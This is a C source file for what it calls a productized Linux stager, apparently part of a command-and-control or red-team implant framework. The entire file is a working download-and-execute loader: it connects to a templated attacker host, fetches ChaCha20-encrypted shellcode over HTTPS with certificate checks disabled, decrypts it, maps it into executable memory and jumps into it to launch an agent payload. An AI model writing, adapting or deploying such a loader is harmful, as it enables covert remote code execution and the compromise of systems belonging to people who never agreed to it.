/*
 * stager_linux.c — productized Linux stager.
 * Placeholders filled at generate time.
 *
 * Flow: HTTPS GET ChaCha20-encrypted shellcode → decrypt → mmap RX → jump.
 * Inner payload is the existing linux_agent shellcode (decoder stub + SO).
 * The ChaCha20 nonce is derived deterministically from the per-payload key.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#define STAGER_HOST "@@STAGER_HOST@@"
#define STAGER_PORT @@STAGER_PORT@@
#define STAGER_PATH "@@STAGER_PATH@@"
#define STAGER_SSL  @@STAGER_SSL@@
#define STAGER_UA   "@@STAGER_UA@@"

static const unsigned char KEY[] = { @@STAGER_KEY@@ };

/* ---- ChaCha20 (128-bit key variant, 96-bit nonce) ---- */

static uint32_t ch_rotl(uint32_t v, int c) {
    return (v << c) | (v >> (32 - c));
}

static void ch_qr(uint32_t *a, uint32_t *b, uint32_t *c, uint32_t *d) {
    *a += *b; *d ^= *a; *d = ch_rotl(*d, 16);
    *c += *d; *b ^= *c; *b = ch_rotl(*b, 12);
    *a += *b; *d ^= *a; *d = ch_rotl(*d, 8);
    *c += *d; *b ^= *c; *b = ch_rotl(*b, 7);
}

static uint32_t ch_load32(const unsigned char *p) {
    return ((uint32_t)p[0]) | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static void ch_block(const unsigned char key[16], const unsigned char nonce[12],
                     uint32_t counter, uint32_t out[16]) {
    uint32_t init[16], x[16];
    init[0] = 0x61707865; init[1] = 0x3320646e;   /* "expand 16-byte k" */
    init[2] = 0x79622d32; init[3] = 0x6b206574;
    for (int i = 0; i < 4; i++) {
        init[4 + i] = ch_load32(key + 4 * i);
        init[8 + i] = init[4 + i];
    }
    init[12] = counter;
    for (int i = 0; i < 3; i++)
        init[13 + i] = ch_load32(nonce + 4 * i);

    for (int i = 0; i < 16; i++) x[i] = init[i];
    for (int r = 0; r < 10; r++) {
        ch_qr(&x[0], &x[4], &x[8], &x[12]);
        ch_qr(&x[1], &x[5], &x[9], &x[13]);
        ch_qr(&x[2], &x[6], &x[10], &x[14]);
        ch_qr(&x[3], &x[7], &x[11], &x[15]);
        ch_qr(&x[0], &x[5], &x[10], &x[15]);
        ch_qr(&x[1], &x[6], &x[11], &x[12]);
        ch_qr(&x[2], &x[7], &x[8], &x[13]);
        ch_qr(&x[3], &x[4], &x[9], &x[14]);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + init[i];
}

static void ch_decrypt(const unsigned char key[16], const unsigned char nonce[12],
                       unsigned char *data, size_t len) {
    uint32_t block[16];
    uint32_t counter = 0;
    size_t off = 0;
    while (off < len) {
        ch_block(key, nonce, counter, block);
        const unsigned char *kb = (const unsigned char *)block;
        size_t n = len - off;
        if (n > 64) n = 64;
        for (size_t i = 0; i < n; i++)
            data[off + i] ^= kb[i];
        off += n;
        counter++;
    }
}

static int tcp_connect(const char *host, int port) {
    char portstr[16];
    snprintf(portstr, sizeof(portstr), "%d", port);
    struct addrinfo hints, *res = NULL, *rp;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return -1;
    int fd = -1;
    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* Read until \r\n\r\n, return header length; also parse Content-Length if present. */
static int read_http_headers(int (*readfn)(void*, char*, int), void *ctx,
                             char *buf, int cap, long *out_clen) {
    int total = 0;
    *out_clen = -1;
    while (total < cap - 1) {
        int n = readfn(ctx, buf + total, 1);
        if (n <= 0) break;
        total += n;
        if (total >= 4 && memcmp(buf + total - 4, "\r\n\r\n", 4) == 0) {
            buf[total] = 0;
            char *p = strcasestr(buf, "Content-Length:");
            if (p) *out_clen = strtol(p + 15, NULL, 10);
            return total;
        }
    }
    return -1;
}

typedef struct { SSL *ssl; int fd; int use_ssl; } rwctx_t;

static int rw_read(void *v, char *b, int n) {
    rwctx_t *c = (rwctx_t *)v;
    if (c->use_ssl) return SSL_read(c->ssl, b, n);
    return (int)read(c->fd, b, n);
}
static int rw_write(void *v, const char *b, int n) {
    rwctx_t *c = (rwctx_t *)v;
    if (c->use_ssl) return SSL_write(c->ssl, b, n);
    return (int)write(c->fd, b, n);
}

int main(void) {
    int fd = tcp_connect(STAGER_HOST, STAGER_PORT);
    if (fd < 0) return 2;

    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    rwctx_t rw = {0};
    rw.fd = fd;
    rw.use_ssl = STAGER_SSL;

#if STAGER_SSL
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { close(fd); return 3; }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, STAGER_HOST);
    if (SSL_connect(ssl) != 1) {
        SSL_free(ssl); SSL_CTX_free(ctx); close(fd); return 4;
    }
    rw.ssl = ssl;
#endif

    char req[1024];
    int reqlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-cache\r\n"
        "\r\n",
        STAGER_PATH, STAGER_HOST, STAGER_UA);
    if (rw_write(&rw, req, reqlen) != reqlen) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 5;
    }

    char hdr[8192];
    long clen = -1;
    int hlen = read_http_headers(rw_read, &rw, hdr, sizeof(hdr), &clen);
    if (hlen < 0) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 6;
    }
    /* require HTTP 200 */
    if (strncmp(hdr, "HTTP/1.", 7) != 0 || !strstr(hdr, " 200 ")) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 7;
    }

    size_t cap = (clen > 0) ? (size_t)clen : (size_t)(2 * 1024 * 1024);
    if (cap > 8 * 1024 * 1024) cap = 8 * 1024 * 1024;
    unsigned char *buf = (unsigned char *)malloc(cap);
    if (!buf) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 8;
    }

    size_t total = 0;
    while (total < cap) {
        int n = rw_read(&rw, (char *)buf + total, (int)(cap - total));
        if (n <= 0) break;
        total += (size_t)n;
        if (clen > 0 && (long)total >= clen) break;
    }
#if STAGER_SSL
    SSL_shutdown(ssl); SSL_free(ssl); SSL_CTX_free(ctx);
#endif
    close(fd);
    if (total == 0) { free(buf); return 9; }

    unsigned char nonce[12];
    for (int i = 0; i < 12; i++) nonce[i] = KEY[i] ^ 0x5A;
    ch_decrypt(KEY, nonce, buf, total);

    void *mem = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { free(buf); return 10; }
    memcpy(mem, buf, total);
    free(buf);
    if (mprotect(mem, total, PROT_READ | PROT_EXEC) != 0) { munmap(mem, total); return 11; }

    ((void (*)(void))mem)();
    return 0;
}
